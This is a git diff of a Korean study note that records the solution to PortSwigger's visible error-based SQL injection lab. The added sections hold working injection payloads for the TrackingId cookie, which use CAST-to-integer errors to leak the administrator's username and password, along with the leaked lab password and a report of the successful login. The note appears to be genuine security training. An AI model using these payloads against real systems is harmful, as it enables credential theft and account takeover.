@@ -5,45 +5,70 @@ tags:
   - sql-injection
 lab_url: "https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based"
 difficulty: Practitioner
-note_kind: problem
+note_kind: solution
+draft: false
 ---
 
 # Visible error-based SQL injection
 
 ## 문제 조건과 설명
 
-분석용 추적 쿠키의 값이 SQL 조회에 들어간다. 이 실습에서는 SQL 조회 결과가 응답에 표시되지 않는다. 따라서 `UNION`으로 결과 행을 추가하더라도 앞선 상품 목록 문제처럼 값을 읽을 수 있다고 가정할 수 없다. 제목은 **눈에 보이는 오류를 통한 정보 노출**을 다루지만, 어떤 오류 메시지가 나타나는지와 그 안에 무엇이 포함되는지는 직접 확인해야 한다.
+`TrackingId` 쿠키가 SQL 조회에 들어간다. 조회 결과는 화면에 보이지 않지만 SQL 오류의 내용은 응답에 나타난다. 문제에서 `users(username, password)` 테이블을 알려 준다. `administrator`의 비밀번호를 알아내 로그인하면 완료된다.
 
-**12번의 조건부 오류와 다른 질문**
-
-조건부 오류 실습은 오류가 **발생했는지 여부**를 참·거짓 신호로 이용한다. 여기서는 오류의 존재를 넘어서, 표시되는 오류 내용에 데이터가 드러날 수 있는지가 탐색의 핵심이다. 두 경우 모두 일반 조회 결과는 보이지 않지만, 관찰할 수 있는 정보량이 같다고 미리 단정해서는 안 된다.
-
-먼저 정상적인 쿠키 요청과 잘못된 입력의 응답을 비교해 오류가 어디에 표시되는지, 단순한 공통 문구인지, SQL 처리에 관한 구체적인 값을 포함하는지 확인해야 한다. 오류를 한 번 만든 사실만으로 비밀번호가 노출된 것은 아니다. 어떤 입력이 어떤 값을 오류에 드러냈는지까지 확인되어야 한다.
-
-**주어진 데이터와 완료 조건**
-
-공식 설명은 별도의 `users` 테이블 및 `username`, `password` 열을 알려 준다. `administrator`의 실제 비밀번호는 주어지지 않는다. **완료 조건은 SQL injection을 이용해 그 비밀번호를 노출시키고 관리자 계정으로 로그인하는 것**이다. 비밀번호를 추측하거나 다른 계정의 행만 보여 주는 것으로는 목표를 채울 수 없다.
-
-아래에는 실제 오류 문구와 그 해석, 비밀번호 확인 근거, 로그인 결과를 순서대로 남긴다. 현재는 오류의 구체적인 모양이나 데이터 누출 여부를 관찰한 기록이 없다.
-
-출처: [PortSwigger 실습 설명](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
+[PortSwigger 실습](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
 
 ## 탐색 및 풀이 기록
 
-<!-- 아직 이 실습의 요청·응답을 직접 기록하지 않았다. 오류 메시지의 실제 내용을 확인한 뒤 추측과 관찰을 구분해 이어서 적는다. -->
-
 ### 초기 관찰
-<!-- 직접 확인한 내용과 아직 확인하지 못한 점 -->
+
+정상적인 상품 요청은 HTTP 200이었다. `TrackingId` 끝에 작은따옴표를 붙이자 HTTP 500 응답에 `Unterminated string literal`과 `SELECT * FROM tracking WHERE id = ...`가 나타났다. 쿠키 값이 SQL 문자열 안에 들어가는 것을 확인했다.
+
+`UNION SELECT 'TEST'`를 붙인 요청은 HTTP 200이었지만 정상 상품 페이지와 본문이 같았다. `UNION`으로 추가한 값은 화면에 표시되지 않았다.
+
+반면 문자열을 정수로 바꾸도록 하자 오류에 그 문자열이 포함됐다.
+
+~~~sql fragment
+<원래 TrackingId>' UNION SELECT CAST('TEST' AS INTEGER)-- -
+~~~
+
+~~~text
+ERROR: invalid input syntax for type integer: "TEST"
+~~~
+
+이 오류를 통해 값 자체를 읽을 수 있음을 확인했다.
 
 ### 실행 과정
-<!-- 무엇을 왜 했는지 → 실제 결과 → 해석 -->
-<!-- 필요할 때 코드·요청·응답·스크린샷 첨부 -->
+
+처음에는 관리자 비밀번호를 `UNION`과 중첩 `CAST`로 조회하려 했으나, 긴 쿠키 입력에서 `Unterminated string literal` 오류가 났다. 쿼리를 짧게 줄여 먼저 조회한 행의 사용자 이름을 오류로 확인했다.
+
+~~~sql fragment
+' OR 1=CAST((SELECT username FROM users LIMIT 1) AS INT)-- -
+~~~
+
+HTTP 500 응답에 `invalid input syntax for type integer: "administrator"`가 나타났다. 같은 방식으로 `password`를 조회했다.
+
+~~~sql fragment
+' OR 1=CAST((SELECT password FROM users LIMIT 1) AS INT)-- -
+~~~
+
+이번에는 오류에 `5hisa6bivhkxb6o61swp`가 표시됐다. `LIMIT 1`만으로 행 순서를 보장할 수는 없으므로, 이 인스턴스에서 관리자만 해당하는 `username<'b'` 조건을 넣은 짧은 조회에서도 같은 비밀번호가 나오는 것을 확인했다.
+
+~~~sql fragment
+'OR 1=(SELECT password::int FROM users WHERE username<'b')--
+~~~
+
+확인한 비밀번호로 `administrator`에 로그인했다.
 
 ## 최종 결과
-<!-- 완료 여부와 확인 근거 -->
+
+관리자 계정 화면과 실습 완료 배너가 표시됐다.
+
+![administrator 로그인 후 실습 완료 화면](images/lab-visible-error-based/01-administrator-solved.png)
 
 ## 배운 점
-<!-- 새로 알게 된 내용, 잘못 생각했던 부분 -->
+
+일반 조회 결과가 숨겨져 있어도, 형변환 오류가 변환하려던 원래 값을 표시하면 그 오류에서 데이터를 직접 읽을 수 있다. 긴 입력은 이번 요청에서 문법 오류가 났으므로 실제로 동작한 짧은 쿼리로 확인했다.
 
 ## 관련 개념
-<!-- 필요한 개념 노트 링크를 목록으로 추가 -->
+
+- [SQL 기초와 SQL 인젝션이 생기는 원리](../../concepts/sql-injection-foundations.md)
